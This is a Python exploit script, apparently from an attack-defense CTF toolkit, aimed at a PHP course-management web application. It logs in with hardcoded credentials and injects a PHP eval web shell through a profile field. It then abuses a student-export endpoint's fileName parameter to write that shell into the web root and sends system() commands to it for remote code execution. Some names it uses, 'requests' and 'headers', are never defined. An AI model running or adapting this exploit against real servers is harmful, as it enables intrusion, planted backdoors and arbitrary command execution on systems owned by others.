#!/usr/bin/env python

from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback
import hashlib
import time


def vulnerable_attack(target,target_port,cmd):
        
    
    try:           
        # This payload may not work under some php versions
        #payload = "('sy'.'stem')(('bas'.'e64_'.'decode')('%s'))==0"%cmd
        #print payload
        res = shit(target,target_port,cmd)
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res




def shit(target,target_port,cmd):
    s = requests.Session()
    ip = target
    shellhash =  hashlib.md5(str(time.time())).hexdigest()
    url = 'http://%s:%s/app.php/login' % (ip,str(target_port))
    url_2 = 'http://%s:%s/app.php/login_check' %(ip,str(target_port))
    url_3 = 'http://%s:%s/app.php/' %(ip,str(target_port))
    url_4 = 'http://%s:%s/app.php/settings/' % (ip,str(target_port))
    url_5 = 'http://%s:%s/app.php/logout' % (ip,str(target_port))
    url_6 = 'http://%s:%s/app.php/course_set/1/manage/course/1/manage/student/export/datas?fileName=/var/www/html/web/files/tmp/%s.php' % (ip,str(target_port),shellhash)

    content = s.get(url).content

    index_1 = content.find('<meta name="description"')
    index_2 = content.find('name="csrf-token"/>')

    token = content[index_1 + 35 + len('<meta name="description"') : index_2-2]
    debug_print(token)
    s.post(url_2,data={'_username':'FPSlwOy','_password':'FPSlwOy','_csrf_token':'%s'%token})
    s.get(url_3)
    
    shell = '<?php eval($_POST[2222]);?>'
    s.post(url_4, data = {'profile[job]':'%s'%shell,'_csrf_token':'%s'%token})
    s.get(url_5)
    

    content = s.get(url).content
    index_1 = content.find('<meta name="description"')
    index_2 = content.find('name="csrf-token"/>')
    token = content[index_1 + 35 + len('<meta name="description"') : index_2-2]
    debug_print(token)
    s.post(url_2,data={'_username':'teacher','_password':'teacher','_csrf_token':'%s'%token})
    s.get(url_6)

    payload = "system('%s');"%cmd
    data = '2222=%s'% quote(payload)

    res = http("post",target,target_port,"/files/tmp/%s.php"%shellhash,data,headers) 
    print res

    return res
